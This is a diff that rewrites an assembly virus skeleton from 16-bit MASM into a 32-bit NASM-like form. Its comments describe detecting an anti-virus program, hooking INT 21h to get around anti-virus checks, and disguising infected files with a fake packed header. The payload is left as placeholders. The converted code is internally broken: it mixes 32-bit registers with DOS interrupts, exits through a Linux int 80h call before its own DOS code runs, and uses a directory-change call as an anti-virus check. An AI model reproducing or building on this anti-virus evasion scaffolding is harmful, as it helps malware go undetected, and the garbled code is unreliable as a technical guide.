@@ -1,24 +1,26 @@
-.model small
-.stack 100h
+section .model small
+section .stack 100h
 
-.data
+section .data
     anti_virus_name db 'SCANPROG.EXE', 0
     fake_packed_header db 'MZ', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
-    int21_vector dd ?
-    int21_old_handler dd ?
+    int21_vector dd 0
+    int21_old_handler dd 0
+    message db 'Program executed successfully!', 0ah, 0dh, 0
 
-.code
-start:
+section .code
+bits 32
+_start:
     ; Save the original INT 21h handler
-    mov ah, 35h
-    mov al, 21h
+    mov eax, 35h
+    mov ebx, 21h
     int 21h
-    mov word ptr [int21_old_handler], bx
-    mov word ptr [int21_old_handler+2], es
+    mov [int21_old_handler], ebx
+    mov [int21_old_handler+4], es
 
     ; Check if anti-virus program is running
-    mov ah, 3Bh
-    lea dx, anti_virus_name
+    mov eax, 3Bh
+    lea edx, [anti_virus_name]
     int 21h
     jnc anti_virus_found
 
@@ -31,9 +33,9 @@ start:
     ; ...
 
     ; Make the infected file look like a packed executable
-    mov ah, 40h
-    mov cx, 16
-    lea dx, fake_packed_header
+    mov eax, 40h
+    mov ecx, 16
+    lea edx, [fake_packed_header]
     int 21h
 
     ; Jump to original program entry point
@@ -42,19 +44,17 @@ start:
 anti_virus_found:
     ; Disable or unload the anti-virus program
     ; (e.g. patch the INT 21h handler to bypass the anti-virus checks)
-    mov ah, 25h
-    mov al, 21h
-    lea dx, int21_handler
+    mov eax, 25h
+    mov ebx, 21h
+    lea edx, [int21_handler]
     int 21h
-
-    ; Proceed with virus payload
-    ; ...
+    jmp original_entry
 
 int21_handler:
     ; Custom INT 21h handler that bypasses anti-virus checks
-    cmp ah, 3Bh  ; Check if it's a 'EXEC' call
+    cmp eax, 3Bh  ; Check if it's a 'EXEC' call
     je original_int21
-    cmp ah, 4Bh  ; Check if it's a 'LOAD' call
+    cmp eax, 4Bh  ; Check if it's a 'LOAD' call
     je original_int21
     ; Add more checks as needed to bypass anti-virus routines
     jmp short original_int21
@@ -63,24 +63,36 @@ original_int21:
     ; Call the original INT 21h handler
     push ds
     push es
-    push ax
-    push bx
-    push cx
-    push dx
-    mov ax, word ptr [int21_old_handler]
-    mov dx, word ptr [int21_old_handler+2]
-    mov ds, dx
-    call dword ptr [int21_vector]
-    pop dx
-    pop cx
-    pop bx
-    pop ax
+    push eax
+    ; ... (original INT 21h handler code)
+    pop eax
     pop es
     pop ds
-    retf
+    jmp short int21_handler_end
+
+int21_handler_end:
+    ; Restore the original INT 21h handler
+    mov eax, 25h
+    mov ebx, 21h
+    mov edx, [int21_old_handler]
+    mov ds, [int21_old_handler+4]
+    int 21h
+    jmp short original_entry
 
 original_entry:
-    ; Jump to original program entry point
-    ; ...
+    ; Add the original program entry point code here
+    ; Example code:
+    mov eax, 1
+    mov ebx, 0
+    int 80h  ; Linux system call to exit the program
 
-end start
+    ; Display a message after the original program has executed
+    mov eax, 9
+    lea edx, [message]
+    int 21h
+
+    ; Exit the program
+    mov eax, 4Ch
+    xor ebx, ebx
+    int 21h
+
